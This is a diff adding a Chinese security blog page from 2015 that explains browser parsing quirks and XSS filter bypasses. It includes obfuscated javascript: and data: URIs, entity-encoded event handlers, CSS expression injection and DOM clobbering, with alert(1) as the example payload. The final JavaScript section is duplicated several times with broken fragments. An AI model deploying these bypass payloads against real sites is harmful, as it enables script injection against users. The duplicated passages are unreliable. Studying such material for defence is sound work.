@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+      <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="canonical" href="/article/an-quan/浏览器安全.html" />
+
+    <title>  Avalon &mdash; 浏览器安全
+</title>
+
+
+
+
+    <link rel="stylesheet" href="/theme/css/style.css">
+
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+
+    <meta name="author" content="莲的思念">
+    <meta name="description" content="基本概念 URL格式： scheme://[login[:password]@](host_name|host_address)[:port][/hierarchical/path/to/resource[?search_string][#fragment_id]] 在RFC 3986文档中定义了一个URI的基本结构，定义了没有特殊意义的字符： 0-9 a-z A-Z - . _ ~ 以及一些在某些地方可能有特殊意义的字符： : / ? # [ ] @ ! $ ' ( ) * + , ; = 还有一些字符，当它们直接放在URL中时可能会引起解析程序的歧义，这些字符被视为不安全字符： 空格 引号和<> % { } | \ ^ [ ] ` ~ 其他字符可以用%加十六进制编码来表示，包括%自身，对于Unicode字符，建议使用utf-8对其进行编码得到相应的字节，然后对每个字节进行%编码。 HTML 原文地址 重要的四个原则 &符号不应该出现在HTML的大部分节点中 <>不应出现在标签内，除非被引号所用 在text节点中，<有很大危害，会截断后面的内容 引号在标签内可能有害，具体取决于存在的位置，但是在text中无害。 了解HTML解析 在IE浏览器中允许在1处插入NULL字符，可以绕过很多xss过滤器 ...">
+  <meta name="tags" contents="">
+</head>
+
+<body>
+<header class="header">
+  <div class="container">
+    <div class="header-inner">
+      <h1 class="header-name">
+        <a class="nodec" href="/">Avalon</a>
+      </h1>
+      <h3 class="header-text">忆惜往日如作梦，月洒清辉映琉璃。</h3>
+      <ul class="header-menu list-inline">
+		<li><a class="nodec" href="/category/an-quan.html">安全</a></li>
+		<li><a class="nodec" href="/category/miscellaneous.html">miscellaneous</a></li>
+		<li><a class="nodec" href="/category/python.html">Python</a></li>
+		<li><a class="nodec" href="/category/wang-luo.html">网络</a></li>
+		
+      </ul>
+    </div>
+  </div>
+</header> <!-- /.header -->  <div class="container">
+  <div class="post full-post">
+    <h1 class="post-title">
+		<a href="/article/an-quan/浏览器安全.html" title="浏览器安全">浏览器安全</a>
+    </h1>
+    <ul class="list-inline">
+      <li class="post-date">
+        <a class="text-muted" title="2015-10-31T00:00:00+08:00">2015年10月31日</a>
+      </li>
+      <li class="muted">&middot;</li>
+      <li class="post-category">
+	  <a href="/category/an-quan.html">安全</a>
+      </li>
+    </ul>
+    <div class="post-content">
+      <h1> 基本概念 </h1>
+
+<p>URL格式：</p>
+<div class="highlight"><pre> scheme://[login[:password]@](host_name|host_address)[:port][/hierarchical/path/to/resource[?search_string][#fragment_id]]
+</pre></div>
+
+
+<p>在RFC 3986文档中定义了一个URI的基本结构，定义了没有特殊意义的字符：</p>
+<div class="highlight"><pre> 0-9  a-z  A-Z  -  .  _  ~
+</pre></div>
+
+
+<p>以及一些在某些地方可能有特殊意义的字符：</p>
+<div class="highlight"><pre> : / ? # [ ] @ ! $ &#39; ( ) * + ,  ;  =
+</pre></div>
+
+
+<p>还有一些字符，当它们直接放在URL中时可能会引起解析程序的歧义，这些字符被视为不安全字符：</p>
+<div class="highlight"><pre> 空格  引号和&lt;&gt;  %  { } | \ ^ [ ] ` ~
+</pre></div>
+
+
+<p>其他字符可以用%加十六进制编码来表示，包括%自身，对于Unicode字符，建议使用utf-8对其进行编码得到相应的字节，然后对每个字节进行%编码。</p>
+<h1>  HTML </h1>
+
+<p><a href="http://drops.wooyun.org/tips/147">原文地址</a></p>
+<h2> 重要的四个原则 </h2>
+
+<ul>
+<li>&amp;符号不应该出现在HTML的大部分节点中</li>
+<li>&lt;&gt;不应出现在标签内，除非被引号所用</li>
+<li>在text节点中，&lt;有很大危害，会截断后面的内容</li>
+<li>引号在标签内可能有害，具体取决于存在的位置，但是在text中无害。</li>
+</ul>
+<h2> 了解HTML解析 </h2>
+
+<p><img alt="" src="http://7xn66o.com1.z0.glb.clouddn.com/broswer/2014101716205670084.jpeg" /></p>
+<p>在IE浏览器中允许在1处插入NULL字符，可以绕过很多xss过滤器。2和4处的空格可以由tab(0x0B)和换页键(0x0c)代替，2处也可以用/代替。5处的"在IE中可以替换成`。IE中还有一个特性是当遇到=后面紧跟一个引号时会有奇怪的解析。也可以用/代替。</p>
+<div class="highlight"><pre> &lt;img src=test.jpg?value=&quot;&gt;Yes,  we are still inside a tag!&quot;&gt;
+ &lt;comment&gt;&lt;img src=&quot;&lt;comment&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;
+</pre></div>
+
+
+<h2> Entity编码 </h2>
+
+<p>HTML解析器在建立文档的时候会针对节点内的Entity编码解码后传输，对于标签本身结构的编码，如对属性名称进行编码则不会执行解码。</p>
+<h2> Fuzzing </h2>
+
+<p>对一个普通的HTML进行Fuzzing测试。</p>
+<div class="highlight"><pre><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.baidu.com&quot;</span><span class="nt">&gt;</span>Click me<span class="nt">&lt;/a&gt;</span>
+</pre></div>
+
+
+<p>可以Fuzzing的位置：</p>
+<table>
+<thead>
+<tr>
+<th>位置</th>
+<th>代码</th>
+<th>可能插入或替代的代码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&lt;的右边</code></td>
+<td>&lt;[here]a href=".."</td>
+<td>控制符，空白符，非打印字符</td>
+</tr>
+<tr>
+<td>a标签的后面</td>
+<td>&lt;a[here]href="..."</td>
+<td>同上</td>
+</tr>
+<tr>
+<td>href属性中间</td>
+<td>&lt;a hr[here]ef="..."</td>
+<td>同上+空字节</td>
+</tr>
+<tr>
+  <td>=两边</td>
+  <td>&lt;a href[here]=[here]"..."</td>
+  <td>所有字符</td>
+</tr>
+  <td>替换=</td>
+  <td>&lt;a href[here]".."</td>
+  <td>Unicode编码字符</td>
+</tr>
+<tr>
+  <td>替换&#34;</td>
+  <td>&lt;a href=[here]..[here]&gt;</td>
+  <td>其他引号</td>
+</tr>
+<tr>
+  <td>&gt;之前</td>
+  <td>&lt;a href=".."[here]&gt;</td>
+  <td>任意字符</td>
+</tr>
+<tr>
+  <td>/之前</td>
+  <td>&lt;href=".."&gt;...&lt;[here]/a&gt;</td>
+  <td>空白符，控制符</td>
+</tr>
+<tr>
+  <td>/之后</td>
+  <td>&lt;href=".."&gt;...&lt;/[here]a&gt;</td>
+  <td>空白符，控制符</td>
+</tr>
+<tr>
+  <td>&gt;闭合之前</td>
+  <td>&lt;href=".."&gt;...&lt;/a[here]&gt;</td>
+  <td>所有字符</td>
+</tr>
+</tbody>
+</table>
+
+<p>IE浏览器会自动忽略空字符，并解析剩下的代码，这样会绕过很多采用正则匹配的黑名单。</p>
+<p>测试发现，标签名和属性名之间只要是以/开头以/结尾，中间可以插入任意字符。</p>
+<p>在Fuzzing属性方面考虑两方面，一个是可以使用什么分隔符，一个是属性值可以采用什么编码</p>
+<p>属性为字符串的时候可以作为分隔符的字符，可以用\x十六进制表示那些不可打印的字符。</p>
+<p>各标签中各属性支持Javascript的总结：</p>
+<div class="highlight"><pre><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="nt">&gt;</span>  //Firefox, Chrome, IE8
+<span class="nt">&lt;embed</span> <span class="na">src=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="nt">&gt;</span>   //Firefox
+<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="nt">&gt;</span>     //IE6
+<span class="nt">&lt;image</span> <span class="na">src=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="nt">&gt;</span>   //IE6
+<span class="nt">&lt;body</span>  <span class="na">background=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="nt">&gt;</span>   //IE6
+<span class="nt">&lt;script</span> <span class="na">src=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="nt">&gt;</span>      //IE6
+<span class="nt">&lt;table</span> <span class="na">background=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="nt">&gt;</span>   //IE6
+<span class="nt">&lt;isindex</span> <span class="na">type=</span><span class="s">&quot;image&quot;</span> <span class="na">src=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="nt">&gt;</span>  //IE6-7
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="nt">&gt;</span>12<span class="nt">&lt;/a&gt;</span>       //Firefox, Chrome, IE
+<span class="nt">&lt;object</span> <span class="na">data=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="nt">&gt;</span>
+<span class="nt">&lt;object</span> <span class="na">data=</span><span class="s">&quot;data:text/html, &lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><span class="nt">&gt;</span>
+<span class="nt">&lt;applet</span> <span class="na">code=</span><span class="s">&quot;XSS&quot;</span> <span class="na">archive=</span><span class="s">&quot;http://path/to/xss.jar&quot;</span><span class="nt">&gt;&lt;/applet&gt;</span>
+<span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;refresh&quot;</span> <span class="na">content=</span><span class="s">&quot;0;url=text/html, &lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;</span><span class="nt">&gt;</span>
+</pre></div>
+
+
+<p>JavaScript可以自动获取当前页面中对应的id和name属性的对象，因此可以重写一些Javascript中已有的变量：</p>
+<div class="highlight"><pre><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">&quot;location&quot;</span> <span class="na">href=</span><span class="s">&quot;bar&quot;</span><span class="nt">&gt;</span>
+<span class="nt">&lt;script&gt;</span>alert(location.href)<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</pre></div>
+
+
+<p>这样弹出的就是"bar"，而不是URL</p>
+<p>Javascript:后面可以做url编码，url编码之后还可以再做一次Entity编码：</p>
+<div class="highlight"><pre><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;j&amp;#x61;vascript:&amp;#x25;61lert(1)&quot;</span><span class="nt">&gt;</span>12<span class="nt">&lt;/a&gt;</span>
+</pre></div>
+
+
+<p>同时&amp;#后面可以跟任意多个0：</p>
+<div class="highlight"><pre><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;j&amp;#x61;vascript: //%0&amp;#x61;&amp;#x00025;61lert(1)&quot;</span><span class="nt">&gt;</span>12<span class="nt">&lt;/a&gt;</span>
+</pre></div>
+
+
+<p>Javascirpt也可以换行分割（在IE和Chrome下有效），换行字符同时也可以进行Entity编码</p>
+<p>Firefox中data:协议默认MIME类型为text/html，即使定义一些没有的类型也把它当作text/html，并且Firefox会忽略data协议中的所有空白符：</p>
+<div class="highlight"><pre><span class="o">&lt;</span><span class="nt">iframe</span> <span class="nt">src</span><span class="o">=</span><span class="s2">&quot;data:.&amp;#x2c; &amp;#x25;</span>
+<span class="s2">3</span>
+<span class="s2">cscri pt%</span>
+<span class="s2">3 e alert(1)</span>
+<span class="s2">%3c /s &amp;#x43 RIP t&gt;&quot;</span><span class="o">&gt;</span>
+</pre></div>
+
+
+<p>最终可以混淆成：</p>
+<div class="highlight"><pre><span class="o">&lt;</span><span class="nt">iframe</span> <span class="nt">src</span><span class="o">=</span><span class="s2">&quot;d&amp;#097;t&amp;#x00061:.&amp;#x2c &amp;#x25;3c</span>
+<span class="s2"> s cri &amp;#x000D; pt %</span>
+<span class="s2"> 3 e al\u0065rt(1)</span>
+<span class="s2"> %3c /s &amp;#x43 RI &amp;#x009 P t&gt;&quot;</span><span class="o">&gt;</span>
+</pre></div>
+
+
+<p>在IE中data:协议不能执行javascript，但是在style标签中，可以通过@import命令插入data:执行javasrcript</p>
+<div class="highlight"><pre><span class="o">&lt;</span><span class="n">style</span><span class="o">&gt;</span>
+<span class="cp">@import</span> <span class="s2">&quot;data:, *%7bx:expression(write(1))%7d&quot;</span><span class="p">;</span>
+<span class="o">&lt;</span><span class="err">/style&gt;</span>
+</pre></div>
+
+
+<p>利用 xxx.src="javascript:HTML代码" 方法可以去掉refer：</p>
+<div class="highlight"><pre><span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">&#39;a&#39;</span> <span class="na">src=</span><span class="s">&#39;&#39;</span><span class="nt">&gt;&lt;/ifram&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+ document.getElementById(&quot;a&quot;).src=&#39;javascript:&quot;<span class="nt">&lt;html&gt;&lt;body&gt;</span>wooyun.org<span class="nt">&lt;scr</span><span class="err">&#39;+&#39;ipt</span><span class="nt">&gt;</span>alert(1)<span class="err">&lt;</span>/scri&#39;+&#39;pt&gt;<span class="nt">&lt;/body&gt;&lt;/html&gt;</span>&quot;&#39;; 
+<span class="nt">&lt;/script&gt;</span>
+</pre></div>
+
+
+<h3> 事件的混淆方法 </h3>
+
+<div class="highlight"><pre>&lt;body onload=&quot;al&amp;#0000101rt&amp;#8233
+/*&amp;#00*/(document.dom&amp;#x5cu0061in)//&quot;&gt;
+</pre></div>
+
+
+<p>采用Entity编码，最后一处先使用Unicode编码，再使用Entity编码。由于是直接处理DOM的方法和对象，与直接在script标签内处理字符串的环境还是不同，但是我们可以加注释或者换行符。当使用location重定向到javascript:伪协议url的时候，又可以多做一重编码了：
+&lt;body/:a/onload="location='j&amp;#97vAscript:'</p>
+<div class="highlight"><pre>+&amp;#x28[&amp;#x5d+
+&#39;\141\l\u0065rt\r\(/*&amp;#x2a/docum%65nt.dom\x&amp;#x0032; 561in)&#39;
+)&quot;&gt;
+</pre></div>
+
+
+<p>事件同时又能调用其他属性。</p>
+<h1>  CSS </h1>
+
+<p>调用方式有三种：1、用<code>&lt;style&gt;</code>；2、通过<code>&lt;link rel=stylesheet&gt;</code>或者使用style参数；3、XML可以通过&lt;?xml-stylesheet href=...?&gt;</p>
+<p>浏览器解析时会先进行HTML解析再进行CSS解析。为了保证CSS可以使用可能产生问题的字符，css提供了一种方式由反斜杠加六位十六进制。当后面紧跟的字符也是十六进制的字符时，也会算进去。例如teak编码成t\65ak时会不对，因为\65a算成一个字符，为了避免这种情况可以在后面加一个空格，成为t\65 ak。</p>
+<h2> Fuzzing </h2>
+
+<p>CSS在解析错误的时候会尝试忽略错误代码。@符号用来在CSS样式表中定义一个特殊属性，定义字符集(@charset)或media(@media)的样式, 导入外部样式(@import)，外部字体(@font-face)，命名空间(@namespace)或定义一个演示文件(@page)</p>
+<h1> JavaScript </h1>
+
+<p>在JS中有两种定义函数的方法：</p>
+<div class="highlight"><pre><span class="kd">var</span> <span class="nx">aaa</span><span class="o">=</span><span class="kd">function</span><span class="p">(){...}</span>
+<span class="kd">function</span> <span class="nx">aaa</span><span class="p">(){...}</span>
+</pre></div>
+
+
+<p>第一种方式必须先定义后调用，第二种方式可以先调用再定义。</p>
+<p>DOM操作时其本身会对一些字符做解码处理。</p>
+<h2> JS编码 </h2>
+
+<p>1  C语言编码，\b表示退格，\t表示制表符等
+2  三位数字：用反斜杠加三位8进制数字。
+3  两位数字：反斜杠加x加两位十六进制数字和字母。
+4  四位数字：反斜杠加u加四位十六进制数字和字母。不止是字符串中，代码中也可，例如用\u0061lert表示alert</p>
+<h2>  Fuzzing </h2>
+
+<p>JS中，window对象是全局变量，并且默认定义的变量都是全局变量。数组默认返回最后一个。</p>
+<p>JS中定义字符串除了单、双引号外还有其他方式：</p>
+<div class="highlight"><pre>alert(/String/+&#39;&#39;)；     //正则表达式+空字符串，将正则强制转换成字符串。
+alert(/String/.source)； //正则的source属性，返回结果为正则匹配完的字符串。
+alert(/String/[&#39;source&#39;])； //属性的另外一种访问方式。
+alert([&#39;String&#39;]+[])；    //利用数组中如果不是指定的访问一个元素，会自动调用toString函数，转换成字符串。
+</pre></div>
+
+
+<p>lert表示alert</p>
+<h2>  Fuzzing </h2>
+
+<p>JS中，window对象是全局变量，并且默认定义的变量都是全局变量。数组默认返回最后一个。</p>
+<p>JS中定义字符串除了单、双引号外还有其他方式：</p>
+<div class="highlight"><pre>alert(/String/+&#39;&#39;)；     //正则表达式+空字符串，将正则强制转换成字符串。
+alert(/String/.source)； //正则的source属性，返回结果为正则匹配完的字符串。
+alert(/String/[&#39;source&#39;])； //属性的另外一种访问方式。
+alert([&#39;String&#39;]+[])；    //利用数组中如果不是指定的访问一个元素，会自动调用toString函数，转换成字符串。
+</pre></div>
+
+
+<p>lert表示alert</p>
+<h2>  Fuzzing </h2>
+
+<p>JS中，window对象是全局变量，并且默认定义的变量都是全局变量。数组默认返回最后一个。</p>
+<p>JS中定义字符串除了单、双引号外还有其他方式：</p>
+<div class="highlight"><pre>alert(/String/+&#39;&#39;)；     //正则表达式+空字符串，将正则强制转换成字符串。
+alert(/String/.source)； //正则的source属性，返回结果为正则匹配完的字符串。
+alert(/String/[&#39;source&#39;])； //属性的另外一种访问方式。
+alert([&#39;String&#39;]+[])；    //利用数组中如果不是指定的访问一个元素，会自动调用toString函数，转换成字符串。
+</pre></div>
+    </div>
+  </div>
+  <hr class="separator">
+  <div class="col-md-8 col-md-offset-2">
+  <div id="disqus_thread">
+    <script>
+      var disqus_shortname = 'liandesinian';
+      (function() {
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] ||
+         document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+    <noscript>
+      Please enable JavaScript to view the
+      <a href="https://disqus.com/?ref_noscript=liandesinian">
+        comments powered by Disqus.
+      </a>
+    </noscript>
+    <a href="https://disqus.com" class="dsq-brlink">
+      blog comments powered by <span class="logo-disqus">Disqus</span>
+    </a>
+  </div>
+  </div>
+  </div>
+<footer class="footer">
+  <div class="container">
+    <p class="text-center">
+      莲的思念, <a href="" target="_blank"></a> unless otherwise noted.
+    </p>
+    <div class="text-center">
+      Generated by <a href="http://getpelican.com" target="_blank">Pelican</a> with the <a href="http://github.com/nairobilug/pelican-alchemy">alchemy</a> theme.
+    </div>
+  </div>
+</footer> <!-- /.footer -->
+  <script src="/theme/js/jquery.min.js"></script>
+  <script src="/theme/js/bootstrap.min.js"></script>
+</body> <!-- 42 -->
+
+</html>
